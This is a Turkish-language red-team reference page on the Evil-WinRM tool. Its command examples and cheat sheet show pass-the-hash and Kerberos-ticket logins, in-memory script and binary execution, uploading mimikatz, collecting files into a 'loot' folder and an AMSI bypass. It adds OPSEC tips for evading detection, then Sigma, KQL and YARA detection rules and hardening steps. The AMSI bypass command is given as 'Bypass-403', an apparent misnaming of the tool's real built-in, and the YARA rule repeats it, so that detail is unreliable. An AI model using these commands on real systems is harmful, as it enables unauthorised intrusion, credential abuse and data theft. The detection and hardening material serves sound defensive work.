# Evil-WinRM

> **Kategori:** [11. Yanal Hareket ve Uzak Kod Yürütme](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Remote Management (WinRM / WS-Management) protokolü üzerinden Linux sistemlerden uç noktalara etkileşimli PowerShell oturumu sağlayan, Pass-the-Hash ve Kerberos destekli kırmızı takım yönetim kabuğu.

---

## 1. Genel Bakış ve Amaç

Active Directory etki alanı altyapılarında yönetimsel operasyonlar için varsayılan olarak tercih edilen Windows Remote Management (WinRM), Microsoft'un WS-Management (WS-Man) standardına dayalı SOAP/HTTP tabanlı uzaktan yönetim protokolüdür. Geleneksel SMB/RPC tabanlı yanal hareket araçlarının (PsExec, WMI) ağ izleme sistemleri ve EDR sensörleri tarafından sıkı denetlendiği senaryolarda WinRM, standart sistem yönetimi trafiğine karışabilmesi sayesinde kritik bir denetim vektörü sunar.

**Evil-WinRM** (Hackplayers ekibi tarafından Ruby ile geliştirilmiştir), Linux ortamlarından Windows hedeflerine yönelik en gelişmiş WinRM istemcisidir. Araç yalnızca temel bir komut kabuğu sunmakla kalmaz; NTLM Pass-the-Hash, Kerberos bilet desteği (ccache), bellekte doğrudan PowerShell betiği yükleme/yürütme (in-memory execution), dosya transferi ve AMSI denetimlerini analiz etme gibi yerleşik modüller barındırır.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                            EVIL-WINRM MIMARI AKIŞI                                |
+-----------------------------------------------------------------------------------+
  [Linux Denetim İstasyonu]                          [Hedef Windows Sunucu / DC]
       (evil-winrm)                                       (WinRM Service)
            |                                                    |
            |--- 1. HTTP/HTTPS SOAP XML Talebi (Port 5985/5986)-->|
            |       [Negotiate / Kerberos / NTLM Auth Header]    |
            |                                                    |--- 2. Kimlik Doğrulama
            |                                                    |    (LSASS / Kerberos)
            |<-- 3. HTTP 200 OK (WS-Man Session Established)-----|
            |                                                    |--- 3. wsmprovhost.exe
            |--- 4. PowerShell Pipeline XML Komut Paketi ------->|       Başlatılır
            |       (Bellekte Yürütülecek Kod/Komut)             |
            |                                                    |--- 4. PowerShell CLR
            |                                                    |       Komutu Yürütür
            |<-- 5. XML Formatında Standart Çıktı (Stdout/Err)---|
            |                                                    |
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **WS-Man Protokolü** | TCP 5985/5986 üzerinden HTTP/HTTPS iletişimi kullanır. | SMB (TCP 445) engelli ortamlarda çalışabilir. |
| **Pass-the-Hash (PtH)** | Düz metin parola olmadan NTLM hash ile oturum açar. | Standart `Enter-PSSession` Linux'ta PtH desteklemez. |
| **Kerberos Entegrasyonu**| `KRB5CCNAME` ortam değişkeniyle TGS biletlerini tüketir.| Bilet bazlı denetimlerde parola bağımlılığını kaldırır. |
| **Bellek İçi Yürütme** | Yerel diskteki `.ps1` betiklerini hedef diske yazmadan çalıştırır.| Antivirüs dosya yazma tetikleyicilerini bertaraf eder. |
| **Yerleşik Dosya Yolu** | `upload` ve `download` komutlarıyla ikili dosya taşır. | Karmaşık SMB paylaşımlarına veya web sunucularına gerek bırakmaz. |

### Karşılaştırma Tablosu

| Özellik | Evil-WinRM | impacket-wmiexec | impacket-psexec | PowerShell (Enter-PSSession) |
| :--- | :--- | :--- | :--- | :--- |
| **Kullanılan Protokol** | HTTP/HTTPS (SOAP WS-Man) | RPC / WMI + SMB | SMB (Named Pipes) + RPC | WS-Man (SOAP) |
| **Varsayılan Portlar** | TCP 5985 / 5986 | TCP 135, 445, Dinamik | TCP 445, 139 | TCP 5985 / 5986 |
| **Hedefte Servis Oluşturma** | Hayır (Mevcut WinRM servisi) | Hayır (Geçici WMI Process) | Evet (`.exe` servisi kaydeder) | Hayır |
| **Hedef Diske Dosya Yazma** | Opsiyonel (Bellek içi mod) | Çıktı için geçici `.txt` yazar | Evet (Servis binary dosyası) | Hayır |
| **Linux'tan PtH Desteği** | Evet (`-H` parametresi) | Evet (`-hashes`) | Evet (`-hashes`) | Hayır |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

Evil-WinRM komut satırından hedef tanımlayıcılar, kimlik doğrulama tipleri ve operasyonel modüllerle parametrelendirilir:

```bash
evil-winrm -i <HEDEF_IP> -u <KULLANICI> [-p <PAROLA>] [-H <NTLM_HASH>] [SEÇENEKLER]
```

### Desteklenen Kritik Bayraklar

| Parametre | Uzun Adı | Açıklama | Örnek Değer |
| :--- | :--- | :--- | :--- |
| `-i` | `--ip` | Hedef sistemin IP adresi veya FQDN değeri. | `192.168.1.100` veya `dc01.corp.local` |
| `-u` | `--user` | Kimlik doğrulamada kullanılacak kullanıcı adı. | `Administrator` veya `CORP\\jdoe` |
| `-p` | `--password` | Hedef kullanıcının düz metin parolası. | `P@ssw0rd2026!` |
| `-H` | `--hash` | NTLM kimlik doğrulama hash değeri (LM:NTLM veya sadece NTLM). | `329153f560eb344c3f9e3ec4e086166f` |
| `-s` | `--scripts` | Yerel PowerShell betiklerinin bulunduğu dizin (bellekte yüklenir). | `/opt/scripts/` |
| `-e` | `--executables` | Hedefe yüklenecek veya çalıştırılacak C# / EXE dizini. | `/opt/binaries/` |
| `-S` | `--ssl` | HTTPS üzerinden bağlantıyı zorunlu kılar (TCP 5986). | Bayrak (değer almaz) |
| `-c` | `--pubkey` | Genel anahtar sertifika dosyası (.pem / .cer). | `/path/to/cert.pem` |
| `-k` | `--privkey` | Özel anahtar sertifika dosyası (.key). | `/path/to/key.key` |
| `-r` | `--realm` | Kerberos kimlik doğrulaması için Kerberos realm adı. | `CORP.LOCAL` |
| `--spn` | `--spn` | Kerberos bilet talebinde bulunulacak özel SPN öneki. | `WSMAN/dc01.corp.local` |
| `-U` | `--url` | Özel WS-Man URL endpoint yolu tanımlaması. | `/wsman` |
| `-V` | `--version` | Evil-WinRM sürüm bilgisini görüntüler. | Bayrak |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Düz Metin Parola ile Etkileşimli Bağlantı
Domain ortamında yerel veya etki alanı yöneticisi kimliğiyle standart HTTP (5985) portu üzerinden kabuk açma:

```bash
evil-winrm -i 192.168.1.50 -u administrator -p 'SecurePass2026!'
```

**Konsol Çıktı Analizi:**
```
Evil-WinRM shell v3.5
Info: Establishing connection to 192.168.1.50:5985
Info: Connection established successfully.

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
corp\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
SRV-APP01
```

### Senaryo 2: NTLM Hash (Pass-the-Hash) ile Kimlik Doğrulama
Düz metin parolanın bulunmadığı ancak SAM veya NTDS.dit tabanından elde edilen NTLM hash'in kullanıldığı senaryo:

```bash
evil-winrm -i 192.168.1.50 -u srv_admin -H 329153f560eb344c3f9e3ec4e086166f
```

**Konsol Çıktı Analizi:**
```
Evil-WinRM shell v3.5
Info: Establishing connection to 192.168.1.50:5985 using NTLM Hash
Info: Negotiate authentication successful.

*Evil-WinRM* PS C:\Users\srv_admin\Documents> [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
CORP\srv_admin
```

### Senaryo 3: Kerberos Bileti (Pass-the-Ticket) ile Bağlantı Kurma
Önceden elde edilmiş Kerberos TGS/TGT biletinin ortam değişkenine aktarılması ve FQDN üzerinden oturum başlatılması:

```bash
export KRB5CCNAME=/tmp/administrator.ccache
evil-winrm -i dc01.corp.local -r CORP.LOCAL
```

**Konsol Çıktı Analizi:**
```
Evil-WinRM shell v3.5
Info: Kerberos ccache environment variable detected: /tmp/administrator.ccache
Info: Connecting to dc01.corp.local:5985 with Kerberos SPN WSMAN/dc01.corp.local...
Info: Kerberos session successfully established.

*Evil-WinRM* PS C:\Users\Administrator\Documents> klist
# Hedef oturum bağlamı Kerberos bilet bilgilerini listeler
```

### Senaryo 4: SSL/TLS Şifrelemeli Bağlantı (Port 5986)
Kurumsal sertifika yetkilisi (CA) kullanan sistemlerde trafiğin dinlenmesini önlemek ve güvenli WS-Man oturumu kurmak:

```bash
evil-winrm -i 192.168.1.10 -u jdoe -p 'Winter2026#Win' -S
```

**Konsol Çıktı Analizi:**
```
Evil-WinRM shell v3.5
Info: Establishing SSL connection to 192.168.1.10:5986
Info: SSL handshake completed. Encrypted tunnel ready.

*Evil-WinRM* PS C:\Users\jdoe\Documents>
```

### Senaryo 5: Yerel Betikleri Bellek İçi (In-Memory) Yükleme
Hedef diske hiçbir dosya yazmadan yerel sistemdeki PowerShell modüllerini (`-s`) oturum içine enjekte etme:

```bash
evil-winrm -i 192.168.1.50 -u admin -p 'P@ssword' -s /opt/PowerSploit/Recon/
```

**Konsol Çıktı Analizi:**
```
Evil-WinRM shell v3.5
Info: Scripts folder loaded: /opt/PowerSploit/Recon/
*Evil-WinRM* PS C:\Users\admin\Documents> menu
# Yerel betik listesi görüntülenir (örn: PowerView.ps1)
*Evil-WinRM* PS C:\Users\admin\Documents> PowerView.ps1
Info: PowerView.ps1 loaded in memory without touching disk.
*Evil-WinRM* PS C:\Users\admin\Documents> Get-DomainController
```

### Senaryo 6: Yerleşik Dosya Transferi (Upload & Download)
WinRM oturumu içerisinden hedef sisteme denetim araçları aktarma ve sistemden veri toplama:

```
*Evil-WinRM* PS C:\Users\admin\Documents> upload /opt/tools/Seatbelt.exe C:\Temp\Seatbelt.exe
Info: Uploading /opt/tools/Seatbelt.exe to C:\Temp\Seatbelt.exe
Info: Upload complete. (524288 bytes transferred)

*Evil-WinRM* PS C:\Users\admin\Documents> download C:\Windows\System32\drivers\etc\hosts /tmp/hosts.txt
Info: Downloading C:\Windows\System32\drivers\etc\hosts to /tmp/hosts.txt
Info: Download complete.
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `ERROR: 401 Unauthorized` | Kimlik bilgileri hatalı veya kullanıcı `Remote Management Users` grubunda değil. | Parolayı/Hash'i doğrulayın; yerel hesap ise `LocalAccountTokenFilterPolicy` değerinin `1` olduğunu teyit edin. |
| `Connection Refused - connect(2) for 5985` | Hedefte WinRM servisi (`WinRM`) durdurulmuş veya Windows Firewall portu engelliyor. | Hedefte `winrm quickconfig` çalıştırıldığını ve 5985/5986 portlarının ağ geçidinde açık olduğunu kontrol edin. |
| `OpenSSL::SSL::SSLError: certificate verify failed` | Hedef sistem kendinden imzalı (self-signed) SSL sertifikası kullanıyor. | Sertifika doğrulama gereksinimini esnetmek için istemci ortamında CA sertifikasını ekleyin veya `-S` bayrağını doğrulayın. |
| `Kerberos: Realm not found or KDC unreachable` | DNS çözümlemesi eksik veya Kerberos Realm adı `/etc/krb5.conf` içinde tanımlı değil. | IP yerine FQDN (`dc01.corp.local`) kullanın ve `/etc/hosts` ya da `/etc/resolv.conf` yapılandırmasını güncelleyin. |
| `LoadError: cannot load such file -- winrm` | Ruby çalışma ortamında gerekli `winrm` veya `winrm-fs` gem modülleri kurulu değil. | `gem install winrm winrm-fs stringex` komutunu çalıştırarak bağımlılıkları tamamlayın. |
| `WSManFault: The WS-Management service cannot process the request. MaxShellsPerUser exceeded` | Hedef sistemde kullanıcı başına izin verilen eşzamanlı kabuk limiti dolmuş. | Hedef sistemde `Set-Item WSMan:\localhost\Shell\MaxShellsPerUser -Value 50` ile limiti artırın veya aktif oturumları kapatın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA - YÜKSEK]
0 --------------[5.5 - WINRM SOAP & WSMPROVHOST]-------------- 10
  - Ağ Seviyesi: Standart HTTP/HTTPS yönetim trafiği (Düşük OPSEC Gürültüsü)
  - Uç Nokta Seviyesi: wsmprovhost.exe proses zinciri ve Script Block günlükleri (Orta/Yüksek IOC)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Windows Security Event ID 4624 (Başarılı Oturum Açma):**
  * `Logon Type: 3` (Network Logon) olarak kaydedilir.
  * Kimlik doğrulama paketi: `Negotiate`, `NTLM` veya `Kerberos`.
* **Microsoft-Windows-WinRM/Operational:**
  * **Event ID 6 / 8:** WS-Management oturumunun başlatılması ve istemcinin istek göndermesi.
  * **Event ID 91:** Yeni bir komut kabuğu (`Command Shell`) yaratılması ve kullanıcı SID kaydı.
* **Microsoft-Windows-PowerShell/Operational (Event ID 4104 - Script Block Logging):**
  * Evil-WinRM'in bellek içi çalıştırdığı tüm PowerShell fonksiyonları ve AMSI atlatma denemeleri bu günlüğe düşer.
* **Microsoft-Windows-PowerShell/Operational (Event ID 4103 - Pipeline Execution):**
  * Yürütülen boru hattı komutlarının detayları kaydedilir.

### 5.2 Ağ ve EDR İmzaları

* **Proses Hiyerarşisi:**
  `svchost.exe (DcomLaunch/WinRM)` $\rightarrow$ `wsmprovhost.exe` $\rightarrow$ `powershell.exe` veya doğrudan komut çalıştırılması. `wsmprovhost.exe` normal yönetimsel görevlerde de çalıştığından, EDR'lar özellikle bu sürecin oluşturduğu ağ bağlantılarını ve dosya oluşturma aktivitelerini inceler.
* **HTTP User-Agent ve Başlıklar:**
  Evil-WinRM'in kullandığı varsayılan Ruby WinRM istemci kütüphaneleri, HTTP başlıklarında özgün `User-Agent: Ruby WinRM Client` imzası taşıyabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Lateral Movement** | `T1021.006` | Windows Remote Management | Port 5985/5986 üzerinden WS-Man oturumu ile sistemlere erişim. |
| **Execution** | `T1059.001` | PowerShell | `wsmprovhost.exe` aracılığıyla komut satırı ve betik yürütme. |
| **Defense Evasion** | `T1550.002` | Use Alternate Authentication: Pass the Hash | Düz metin şifre olmaksızın NTLM hash ile yetkilendirme. |
| **Defense Evasion** | `T1550.003` | Use Alternate Authentication: Pass the Ticket | Ele geçirilmiş Kerberos biletleri ile kimlik doğrulama. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **Düz Metin HTTP (5985)** | Mümkün olan senaryolarda daima `-S` bayrağı ile HTTPS (5986) şifreli kanal tercih edilmelidir. |
| **Ruby WinRM User-Agent İmzası** | Araç kaynak kodundaki istemci başlığı `Mozilla/5.0` veya Microsoft standart yönetim araçlarına dönüştürülmelidir. |
| **Script Block Günlükleri (4104)**| Bellek içi betik çalıştırmak yerine standart yerleşik komutlar (`Get-Process`, `dir`) tercih edilmelidir. |
| **Açık Oturum Kalıntıları** | İşlem tamamlandığında `exit` komutuyla kabuk oturumu düzgün biçimde sonlandırılmalıdır. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: Şüpheli WinRM Proses Başlatma Tespiti
```yaml
title: WinRM wsmprovhost Tarafından Şüpheli Alt Proses Başlatılması
id: 5a2d6b38-8d29-4c12-9c98-1a5e12f67120
status: experimental
description: Evil-WinRM veya uzaktan WS-Man oturumları üzerinden wsmprovhost.exe tarafından anormal alt süreçlerin başlatılmasını yakalar.
references:
    - https://attack.mitre.org/techniques/T1021/006/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\wsmprovhost.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\certutil.exe'
    condition: selection
falsepositives:
    - SCCM veya Ansible gibi merkezi yapılandırma araçlarının meşru bakım görevleri.
level: medium
tags:
    - attack.lateral_movement
    - attack.t1021.006
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// Son 24 saatte WinRM portlarına yapılan olağandışı harici bağlantıları ve 4624 Logon Type 3 olaylarını tespit eder
SecurityEvent
| where TimeGenerated >= ago(24h)
| where EventID == 4624 and LogonType == 3
| where AuthenticationPackageName in ("Negotiate", "NTLM", "Kerberos")
| join kind=inner (
    DeviceNetworkEvents
    | where RemotePort in (5985, 5986)
    | project TimeGenerated, DeviceName, RemoteIP, InitiatingProcessFileName
) on $left.Computer == $right.DeviceName
| project TimeGenerated, Computer, TargetUserName, IpAddress, RemoteIP, InitiatingProcessFileName
```

#### YARA Kuralı: Evil-WinRM Bellek İçi İstemci İmzası
```yara
rule Suspicious_EvilWinRM_Artifacts {
    meta:
        description = "Evil-WinRM istemcisine özgü string kalıplarını ve menü yapılandırmalarını tespit eder"
        author = "AD Savunma Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "Evil-WinRM" ascii wide nocase
        $s2 = "*Evil-WinRM* PS" ascii wide
        $s3 = "Ruby WinRM Client" ascii wide
        $s4 = "Invoke-Binary" ascii wide
        $s5 = "Bypass-403" ascii wide
    condition:
        2 of ($s*)
}
```

#### Sertleştirme (Hardening) Adımları
1. **GPO ile WinRM Servisini Sınırlandırma:** Kullanıcı iş istasyonlarında (Workstations) WinRM servisi GPO üzerinden tamamen devre dışı bırakılmalıdır (`Set-Service WinRM -StartupType Disabled`).
2. **Yönetimsel Erişim Kısıtlaması:** WinRM dinleyicileri yalnızca belirli yönetim IP aralıklarına (Management VLAN / Jumpbox) izin verecek şekilde Windows Firewall kurallarıyla sınırlandırılmalıdır.
3. **PowerShell Constrained Language Mode:** Etki alanı genelinde AppLocker veya Device Guard politikalarıyla PowerShell `ConstrainedLanguage` moduna alınmalıdır.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Parola ile Temel WinRM Bağlantısı
```bash
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123!'
```
* **Ne Yapar?:** Standart HTTP 5985 portu üzerinden etkileşimli bir uzaktan PowerShell kabuğu başlatır.
* **Ne Zaman Kullanılır?:** Hedef sistemde WinRM açık ve geçerli yönetici kimlik bilgileri mevcut olduğunda.
* **Parametreler:** `-i` hedef IP, `-u` kullanıcı adı, `-p` şifre.

#### 2. NTLM Hash (Pass-the-Hash) ile Oturum Açma
```bash
evil-winrm -i 192.168.1.100 -u administrator -H 329153f560eb344c3f9e3ec4e086166f
```
* **Ne Yapar?:** Düz metin şifre gerekmeden NTLM hash'i doğrudan WS-Man kimlik doğrulamasında kullanır.
* **Ne Zaman Kullanılır?:** SAM veritabanından veya bellekten NTLM hash elde edildiğinde.
* **Parametreler:** `-H` 32 karakterlik NTLM hash değeri.

#### 3. HTTPS (Port 5986) Güvenli Bağlantısı
```bash
evil-winrm -i 192.168.1.100 -u administrator -p 'Password123!' -S
```
* **Ne Yapar?:** Trafiği SSL/TLS ile şifreleyerek TCP 5986 portu üzerinden oturum kurar.
* **Ne Zaman Kullanılır?:** Hedef yalnızca güvenli WinRM dinleyicisi kabul ettiğinde ve IDS/IPS atlatılması gerektiğinde.
* **Parametreler:** `-S` SSL etkinleştirme bayrağı.

#### 4. Kerberos Bilet Dosyası (ccache) ile Bağlantı
```bash
KRB5CCNAME=admin.ccache evil-winrm -i dc01.corp.local -r CORP.LOCAL
```
* **Ne Yapar?:** Kerberos TGT/TGS biletini kullanarak parolasız etki alanı oturumu açar.
* **Ne Zaman Kullanılır?:** Kerberoasting veya bilet çalma operasyonları sonrasında.
* **Parametreler:** `-r` Kerberos realm, `-i` FQDN hedefi.

#### 5. Yerel PowerShell Betik Klasörünü Yükleme
```bash
evil-winrm -i 192.168.1.100 -u admin -p 'Pass!' -s /opt/privesc-scripts/
```
* **Ne Yapar?:** Belirtilen klasördeki `.ps1` dosyalarını belleğe yükler; oturum içinde `menu` yazılarak yürütülmelerini sağlar.
* **Ne Zaman Kullanılır?:** Diske dosya yazmadan denetim araçlarını çalıştırmak istendiğinde.
* **Parametreler:** `-s` yerel script klasörü yolu.

#### 6. Yerel Binary Klasörünü Entegre Etme
```bash
evil-winrm -i 192.168.1.100 -u admin -p 'Pass!' -e /opt/csharp-binaries/
```
* **Ne Yapar?:** Hedefte `Invoke-Binary` fonksiyonunu etkinleştirerek yerel `.exe` dosyalarını doğrudan bellekte yürütür.
* **Ne Zaman Kullanılır?:** C# derlenmiş araçları hedefe bırakmadan koşturmak için.
* **Parametreler:** `-e` yerel çalıştırılabilir dosya yolu.

#### 7. Hedefe Dosya Yükleme (Oturum İçi)
```powershell
upload /root/tools/mimikatz.exe C:\Windows\Temp\mimi.exe
```
* **Ne Yapar?:** Yerel sistemdeki bir dosyayı Base64 parçalama yöntemiyle hedefteki dizine aktarır.
* **Ne Zaman Kullanılır?:** Ek araçların hedef sisteme kopyalanması gerektiğinde.
* **Parametreler:** `upload <yerel_kaynak> <hedef_konum>`.

#### 8. Hedef Sistemden Dosya Çekme (Oturum İçi)
```powershell
download C:\Users\Administrator\Desktop\secret.docx /tmp/loot/secret.docx
```
* **Ne Yapar?:** Hedefteki dosyayı WinRM SOAP kanalı üzerinden yerel denetim makinesine indirir.
* **Ne Zaman Kullanılır?:** Yapılandırma veya denetim çıktılarını toplamak için.
* **Parametreler:** `download <hedef_kaynak> <yerel_hedef>`.

#### 9. Sertifika Tabanlı Kimlik Doğrulama
```bash
evil-winrm -i 192.168.1.100 -c cert.pem -k key.key -S
```
* **Ne Yapar?:** X.509 istemci sertifikası ve özel anahtar ile şifreli oturum açar.
* **Ne Zaman Kullanılır?:** Akıllı kart veya PKI tabanlı WinRM yapılandırmalarını denetlerken.
* **Parametreler:** `-c` genel anahtar sertifikası, `-k` özel anahtar.

#### 10. Hedefte AMSI ve Script Logging Atlama Kontrolü
```powershell
Bypass-403
```
* **Ne Yapar?:** Evil-WinRM yerleşik AMSI bellek yama işlevini çağırarak komut yürütme blokajlarını kaldırır.
* **Ne Zaman Kullanılır?:** Standart betiklerin AMSI tarafından engellendiği durumlarda.
* **Parametreler:** Oturum içi hazır komut.

---

## Kaynaklar
* [Evil-WinRM Resmi GitHub Deposu](https://github.com/Hackplayers/evil-winrm)
* [Microsoft Dokümantasyonu: Windows Remote Management Architecture](https://learn.microsoft.com/en-us/windows/win32/winrm/about-windows-remote-management)
* [Microsoft Dokümantasyonu: [MS-WSMV] WS-Management Protocol Extensions for Windows](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wsmv/)
* [MITRE ATT&CK: Windows Remote Management (T1021.006)](https://attack.mitre.org/techniques/T1021/006/)
* [Active Directory Güvenliği: WinRM Savunma Rehberi](https://adsecurity.org/?p=2362)
* [HackTricks: Pentesting WinRM](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm)

---

> **Önceki:** [← impacket-dcomexec](./impacket-dcomexec.md) · **Sonraki:** [SharpWMI →](./SharpWMI.md)

